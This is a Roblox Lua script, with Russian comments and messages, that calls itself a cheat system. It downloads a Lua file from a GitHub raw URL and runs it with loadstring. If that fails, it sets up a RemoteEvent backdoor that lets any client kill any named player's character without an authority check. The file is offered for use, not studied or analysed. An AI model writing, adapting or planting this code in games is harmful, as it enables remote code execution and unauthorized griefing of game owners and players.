local function LoadCheatSystem()
    local url = "https://raw.githubusercontent.com/dddadads/Cheats/main/Server.lua"
    
    -- Основная загрузка с защитой
    local success, err = pcall(function()
        local serverScript = loadstring(game:HttpGet(url, true))()
        return serverScript
    end)
    
    if success then
        print("✅ Чит-система успешно загружена!")
    else
        warn("❌ Ошибка загрузки:", err)
        
        -- Аварийный режим
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        
        -- Базовый функционал
        local labEvent = Instance.new("RemoteEvent")
        labEvent.Name = "LabEvent"
        labEvent.Parent = ReplicatedStorage
        
        labEvent.OnServerEvent:Connect(function(player, action, target)
            if action == "KillPlayer" then
                local targetPlayer = Players:FindFirstChild(target)
                if targetPlayer and targetPlayer.Character then
                    targetPlayer.Character:BreakJoints()
                end
            elseif action == "KillSelf" and player.Character then
                player.Character:BreakJoints()
            end
        end)
        
        print("⚠️ Активирован базовый режим")
    end
end

LoadCheatSystem()
